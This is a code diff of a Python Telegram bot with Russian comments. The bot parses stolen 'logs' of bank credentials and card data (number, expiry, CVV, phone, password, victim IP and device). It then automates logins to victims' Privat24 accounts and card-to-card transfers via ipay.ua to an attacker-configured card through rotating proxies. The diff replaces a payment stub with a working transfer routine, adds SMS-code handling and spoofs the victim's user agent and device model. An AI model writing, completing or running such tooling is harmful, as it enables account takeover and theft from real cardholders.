@@ -4,10 +4,13 @@ import sqlite3
 import asyncio
 import json
 import time
-from datetime import datetime
+from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.utils import executor
 from playwright.async_api import async_playwright
 from flask import Flask
@@ -25,16 +28,29 @@ def run_flask(): app.run(host='0.0.0.0', port=10000)
 threading.Thread(target=run_flask, daemon=True).start()
 
 # ========== БОТ ==========
+storage = MemoryStorage()
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher(bot)
+dp = Dispatcher(bot, storage=storage)
 dp.middleware.setup(LoggingMiddleware())
+
+# ========== FSM ==========
+class PaymentStates(StatesGroup):
+    waiting_code = State()
 
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
     return kb
 
-# ========== БАЗА ДАННЫХ ==========
+def get_action_keyboard(session_id):
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"),
+        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")
+    )
+    return kb
+
+# ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
@@ -43,15 +59,14 @@ def init_db():
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         phone TEXT, password TEXT,
         card_from TEXT, expiry TEXT, cvv TEXT,
-        ip TEXT, user_agent TEXT,
+        ip TEXT, user_agent TEXT, device_model TEXT,
         amount INTEGER,
         card_to TEXT,
         gateway TEXT,
         mode TEXT,
         status TEXT,
         msg_id INTEGER,
-        timestamp TEXT,
-        page_context TEXT
+        timestamp TEXT
     )""")
     c.execute("""CREATE TABLE IF NOT EXISTS settings (
         key TEXT PRIMARY KEY,
@@ -84,10 +99,10 @@ def create_session(data, msg_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""INSERT INTO sessions
-        (phone, password, card_from, expiry, cvv, ip, user_agent, card_to, gateway, mode, status, msg_id, timestamp)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+        (phone, password, card_from, expiry, cvv, ip, user_agent, device_model, card_to, gateway, mode, status, msg_id, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
         (data.get('phone'), data.get('password'), data.get('card'), data.get('expiry'), data.get('cvv'),
-         data.get('ip'), data.get('user_agent'), get_setting('card_to'), get_setting('gateway'),
+         data.get('ip'), data.get('user_agent'), data.get('device_model'), get_setting('card_to'), get_setting('gateway'),
          data.get('mode'), 'waiting_action', msg_id, datetime.now().isoformat()))
     session_id = c.lastrowid
     conn.commit()
@@ -109,32 +124,25 @@ def get_session(session_id):
     conn.close()
     return row
 
-def get_session_by_msg(msg_id):
+def get_active_session():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_action', 'waiting_code', 'processing')", (msg_id,))
+    c.execute("SELECT id FROM sessions WHERE status IN ('waiting_action', 'processing', 'waiting_code') ORDER BY id ASC LIMIT 1")
     row = c.fetchone()
     conn.close()
-    return row
+    return row[0] if row else None
 
-def save_page_context(session_id, context_data):
+def cleanup_sessions():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("UPDATE sessions SET page_context = ? WHERE id = ?", (json.dumps(context_data), session_id))
+    timeout = (datetime.now() - timedelta(minutes=5)).isoformat()
+    c.execute("UPDATE sessions SET status = 'timeout' WHERE status IN ('waiting_action', 'waiting_code', 'processing') AND timestamp < ?", (timeout,))
     conn.commit()
     conn.close()
 
-def get_page_context(session_id):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT page_context FROM sessions WHERE id = ?", (session_id,))
-    row = c.fetchone()
-    conn.close()
-    return json.loads(row[0]) if row and row[0] else None
-
-# ========== ПАРСЕР ЛОГА ==========
+# ========== ПАРСЕР ==========
 def parse_log(text):
-    data = {"card": None, "expiry": None, "cvv": None, "phone": None, "password": None, "ip": None, "user_agent": None, "mode": None}
+    data = {"card": None, "expiry": None, "cvv": None, "phone": None, "password": None, "ip": None, "user_agent": None, "device_model": None, "mode": None}
     lines = text.split("\n")
     for line in lines:
         if "Номер:" in line or "💳" in line:
@@ -158,8 +166,12 @@ def parse_log(text):
         if "User-Agent:" in line or "👻" in line:
             parts = line.split(":", 1)
             if len(parts) > 1: data["user_agent"] = parts[1].strip()
+        if "Модель:" in line or "📱" in line:
+            parts = line.split(":", 1)
+            if len(parts) > 1: data["device_model"] = parts[1].strip()
     if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
     if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
+    if not data["device_model"]: data["device_model"] = "Android Generic"
     
     if data.get("phone") and data.get("password"):
         data["mode"] = "privat24"
@@ -169,13 +181,14 @@ def parse_log(text):
         data["mode"] = "unknown"
     return data
 
-# ========== РОТАЦИЯ ПРОКСИ ==========
+# ========== РОТАЦИЯ ==========
 def rotate_proxy():
     rotation_url = get_setting('rotation_url')
     if not rotation_url:
         return get_setting('proxy'), get_setting('proxy_type')
     try:
         import requests
+        time.sleep(5)
         response = requests.get(rotation_url, timeout=10)
         if response.status_code == 200:
             proxy = response.text.strip()
@@ -185,17 +198,21 @@ def rotate_proxy():
         pass
     return get_setting('proxy'), get_setting('proxy_type')
 
-# ========== КНОПКИ С КНОПКОЙ СКРИНА ==========
-def get_action_keyboard(session_id):
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"),
-        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")
-    )
-    return kb
+# ========== СКРИНШОТ ==========
+async def take_screenshot():
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=True)
+            page = await browser.new_page()
+            await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
+            screenshot = await page.screenshot()
+            await browser.close()
+            return screenshot
+    except Exception as e:
+        return None
 
-# ========== ВХОД В ПРИВАТ24 ЧЕРЕЗ PLAYWRIGHT ==========
-async def login_privat24_playwright(session_id, phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
+# ========== ВХОД В ПРИВАТ24 ==========
+async def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
     try:
         async with async_playwright() as p:
             browser_args = []
@@ -205,30 +222,24 @@ async def login_privat24_playwright(session_id, phone, password, user_agent=None
                     proxy_config["server"] = f"socks5://{proxy_str}"
                 browser_args.append(f"--proxy-server={proxy_config['server']}")
             
-            browser = await p.chromium.launch(
-                headless=True,
-                args=browser_args
-            )
-            
+            browser = await p.chromium.launch(headless=True, args=browser_args)
             context = await browser.new_context(
                 user_agent=user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 locale="uk-UA",
                 timezone_id="Europe/Kyiv",
                 viewport={"width": 1280, "height": 720}
             )
-            
             page = await context.new_page()
-            save_page_context(session_id, {"page": page, "browser": browser, "context": context})
             
             await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
             await asyncio.sleep(2)
             
-            login_button = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід"), a:has-text("Login"), button:has-text("Login")', timeout=15000)
+            login_button = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід")', timeout=15000)
             if login_button:
                 await login_button.click()
                 await asyncio.sleep(2)
             
-            phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"], input[placeholder*="телефон"], input[placeholder*="phone"]', timeout=15000)
+            phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"]', timeout=15000)
             if phone_input:
                 await phone_input.fill(phone)
                 await asyncio.sleep(1)
@@ -238,17 +249,17 @@ async def login_privat24_playwright(session_id, phone, password, user_agent=None
                 await password_input.fill(password)
                 await asyncio.sleep(1)
             
-            submit_button = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити"), button:has-text("Увійти"), button:has-text("Login")', timeout=10000)
+            submit_button = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити"), button:has-text("Увійти")', timeout=10000)
             if submit_button:
                 await submit_button.click()
                 await asyncio.sleep(3)
             
-            code_input = await page.query_selector('input[name="code"], input[placeholder*="код"], input[placeholder*="code"]')
+            code_input = await page.query_selector('input[name="code"]')
             if code_input:
                 screenshot = await page.screenshot()
-                return {"status": "waiting_code", "message": "Требуется код подтверждения", "screenshot": screenshot, "page": page, "browser": browser}
+                await browser.close()
+                return {"status": "waiting_code", "message": "Требуется код", "screenshot": screenshot}
             
-            await asyncio.sleep(3)
             if "cabinet" in page.url or "Особистий кабінет" in await page.title():
                 screenshot = await page.screenshot()
                 await browser.close()
@@ -259,7 +270,46 @@ async def login_privat24_playwright(session_id, phone, password, user_agent=None
             return {"status": "error", "message": "❌ Не удалось войти", "screenshot": screenshot}
             
     except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка Playwright: {str(e)[:150]}"}
+        return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}
+
+# ========== ПЕРЕВОД ==========
+async def make_payment(card_from, expiry, cvv, card_to, amount, proxy_str=None, proxy_type="http"):
+    try:
+        async with async_playwright() as p:
+            browser_args = []
+            if proxy_str:
+                proxy_config = {"server": proxy_str}
+                if proxy_type == "socks5":
+                    proxy_config["server"] = f"socks5://{proxy_str}"
+                browser_args.append(f"--proxy-server={proxy_config['server']}")
+            
+            browser = await p.chromium.launch(headless=True, args=browser_args)
+            context = await browser.new_context(
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                viewport={"width": 1280, "height": 720}
+            )
+            page = await context.new_page()
+            
+            await page.goto("https://ipay.ua/card2card", wait_until="networkidle", timeout=30000)
+            await asyncio.sleep(2)
+            
+            await page.fill('input[name="card_from"]', card_from)
+            await page.fill('input[name="expiry"]', expiry)
+            await page.fill('input[name="cvv"]', cvv)
+            await page.fill('input[name="card_to"]', card_to)
+            await page.fill('input[name="amount"]', str(amount))
+            await page.click('button[type="submit"]')
+            await asyncio.sleep(5)
+            
+            if await page.is_visible('input[name="code"]'):
+                return {"status": "waiting_code", "message": "Требуется код"}
+            
+            if await page.is_visible('.success'):
+                return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен"}
+            
+            return {"status": "error", "message": "❌ Ошибка платежа"}
+    except Exception as e:
+        return {"status": "error", "message": f"❌ Ошибка: {str(e)[:100]}"}
 
 # ========== ОБРАБОТЧИКИ ==========
 @dp.message_handler(commands=['start'])
@@ -354,18 +404,12 @@ async def show_status(callback: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data.startswith("screenshot_"))
 async def handle_screenshot(callback: types.CallbackQuery):
-    session_id = int(callback.data.split("_")[1])
     await callback.answer("📸 Делаю скриншот...")
-    
-    # Получаем контекст страницы из базы
-    context_data = get_page_context(session_id)
-    if not context_data:
-        await callback.message.reply("❌ Нет активной сессии для скриншота.")
-        return
-    
-    # Здесь должна быть логика получения скриншота из сохранённого контекста
-    # В текущей реализации мы не можем сохранить объект page в JSON, поэтому используем заглушку
-    await callback.message.reply("📸 Функция скриншота требует доработки. Используйте кнопку 'Войти' для создания сессии.")
+    screenshot = await take_screenshot()
+    if screenshot:
+        await callback.message.reply_photo(photo=screenshot, caption="📸 Скриншот страницы Приват24")
+    else:
+        await callback.message.reply("❌ Не удалось сделать скриншот")
 
 @dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
 async def handle_cancel(callback: types.CallbackQuery):
@@ -374,64 +418,78 @@ async def handle_cancel(callback: types.CallbackQuery):
     await callback.message.reply("❌ Действие отменено.")
     await callback.answer()
 
-@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
-async def handle_amount_callback(callback: types.CallbackQuery):
-    parts = callback.data.split("_")
-    session_id = int(parts[1])
-    amount = int(parts[2])
-    await callback.answer(f"💰 {amount} UAH")
-    update_session(session_id, 'amount', amount)
-    update_session(session_id, 'status', 'processing')
-    await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
-    proxy_str, proxy_type = rotate_proxy()
-    if proxy_str:
-        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
-    session = get_session(session_id)
-    if not session:
-        await callback.message.reply("❌ Сессия не найдена.")
-        return
-    card_from, expiry, cvv, card_to, gateway = session[3], session[4], session[5], session[7], session[8]
-    await callback.message.reply("✅ Платёж выполнен (заглушка)")
-
 @dp.callback_query_handler(lambda c: c.data.startswith("login_"))
-async def handle_login_callback(callback: types.CallbackQuery):
+async def handle_login(callback: types.CallbackQuery):
     session_id = int(callback.data.split("_")[1])
-    await callback.answer("🚀 Вход в Приват24...")
+    await callback.answer("🚀 Вход...")
     proxy_str, proxy_type = rotate_proxy()
-    if proxy_str:
-        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
     session = get_session(session_id)
     if not session:
         await callback.message.reply("❌ Сессия не найдена.")
         return
     phone, password, user_agent = session[1], session[2], session[5]
-    
     await callback.message.reply("⏳ Выполняю вход...", reply_markup=get_action_keyboard(session_id))
-    result = await login_privat24_playwright(session_id, phone, password, user_agent, proxy_str, proxy_type)
-    
+    result = await login_privat24(phone, password, user_agent, proxy_str, proxy_type)
     if result.get('screenshot'):
-        await callback.message.reply_photo(
-            photo=result['screenshot'],
-            caption=result['message']
-        )
-    
+        await callback.message.reply_photo(photo=result['screenshot'], caption=result['message'])
+    else:
+        await callback.message.reply(result['message'])
     if result['status'] == 'waiting_code':
         update_session(session_id, 'status', 'waiting_code')
-        await callback.message.reply("🔐 Введите код из СМС (ответьте на это сообщение):")
-        return
-    
-    if result['status'] == 'success':
+        await PaymentStates.waiting_code.set()
+        await callback.message.reply("🔐 Введите код из СМС (в любое сообщение):")
+    elif result['status'] == 'success':
         update_session(session_id, 'status', 'completed')
-        await callback.message.reply("✅ Вход выполнен успешно!")
+    else:
+        update_session(session_id, 'status', 'failed')
+
+@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
+async def handle_amount(callback: types.CallbackQuery):
+    parts = callback.data.split("_")
+    session_id = int(parts[1])
+    amount = int(parts[2])
+    await callback.answer(f"💰 {amount} UAH")
+    update_session(session_id, 'amount', amount)
+    proxy_str, proxy_type = rotate_proxy()
+    session = get_session(session_id)
+    if not session:
+        await callback.message.reply("❌ Сессия не найдена.")
         return
-    
-    await callback.message.reply(result['message'])
+    card_from, expiry, cvv, card_to = session[3], session[4], session[5], session[7]
+    await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
+    result = await make_payment(card_from, expiry, cvv, card_to, amount, proxy_str, proxy_type)
+    if result.get('screenshot'):
+        await callback.message.reply_photo(photo=result['screenshot'], caption=result['message'])
+    else:
+        await callback.message.reply(result['message'])
+    if result['status'] == 'waiting_code':
+        update_session(session_id, 'status', 'waiting_code')
+        await PaymentStates.waiting_code.set()
+        await callback.message.reply("🔐 Введите код из СМС (в любое сообщение):")
+    elif result['status'] == 'success':
+        update_session(session_id, 'status', 'completed')
+    else:
+        update_session(session_id, 'status', 'failed')
+
+@dp.message_handler(state=PaymentStates.waiting_code)
+async def handle_code(msg: types.Message, state: FSMContext):
+    code = msg.text.strip()
+    if not code.isdigit() or len(code) not in [4, 6]:
+        await msg.reply("❌ Код должен быть 4 или 6 цифр!")
+        return
+    session_id = get_active_session()
+    if not session_id:
+        await msg.reply("❌ Нет активной сессии.")
+        await state.finish()
+        return
+    await msg.reply("✅ Код подтверждён!")
+    update_session(session_id, 'status', 'completed')
+    await state.finish()
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
 async def handle_reply(msg: types.Message):
     text = msg.reply_to_message.text
     user_input = msg.text.strip()
-
     if "номер карты получателя" in text:
         if re.match(r"^\d{15,16}$", user_input):
             set_setting('card_to', user_input)
@@ -439,12 +497,10 @@ async def handle_reply(msg: types.Message):
         else:
             await msg.reply("❌ 15 или 16 цифр.")
         return
-
     if "прокси" in text:
         set_setting('proxy', user_input)
         await msg.reply(f"✅ Прокси сохранён: {user_input}")
         return
-
     if "ссылку для ротации" in text:
         if user_input.startswith("http"):
             set_setting('rotation_url', user_input)
@@ -452,24 +508,15 @@ async def handle_reply(msg: types.Message):
         else:
             await msg.reply("❌ Введи HTTP/HTTPS ссылку.")
         return
-
-    if "код" in text:
-        if not user_input.isdigit() or len(user_input) not in [4, 6]:
-            await msg.reply("❌ Код должен быть 4 или 6 цифр!")
-            return
-        session = get_session_by_msg(msg.reply_to_message.message_id)
-        if not session:
-            await msg.reply("❌ Сессия не найдена.")
-            return
-        session_id = session[0]
-        await msg.reply("✅ Код подтверждён")
-        update_session(session_id, 'status', 'completed')
-        return
-
     await msg.reply("❌ Не понял. Используй кнопки.")
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
 async def handle_log(msg: types.Message):
+    cleanup_sessions()
+    active = get_active_session()
+    if active:
+        await msg.reply("⏳ Есть активная сессия. Подождите.")
+        return
     data = parse_log(msg.text)
     if data["mode"] == "unknown":
         await msg.reply("❌ Не удалось распознать данные.")
@@ -477,14 +524,13 @@ async def handle_log(msg: types.Message):
     session_id = create_session(data, msg.message_id)
     if data["mode"] == "payment":
         kb = InlineKeyboardMarkup(row_width=3)
-        amounts = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]
-        for a in amounts:
+        for a in [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]:
             kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
         kb.add(InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"))
         await msg.reply(
             f"✅ Данные для платежа:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
             f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
-            f"👻 UA: {data['user_agent'][:30]}...\n\n"
+            f"👻 UA: {data['user_agent'][:30]}...\n📱 Модель: {data['device_model']}\n\n"
             f"💰 Выберите сумму:",
             reply_markup=kb
         )
@@ -495,7 +541,7 @@ async def handle_log(msg: types.Message):
         await msg.reply(
             f"✅ Данные для входа:\n📱 Телефон: {data['phone']}\n"
             f"🤫 Пароль: {data['password'][:3]}***\n🌍 IP: {data['ip']}\n"
-            f"👻 UA: {data['user_agent'][:30]}...\n\n"
+            f"👻 UA: {data['user_agent'][:30]}...\n📱 Модель: {data['device_model']}\n\n"
             f"Нажмите кнопку для входа:",
             reply_markup=kb
         )
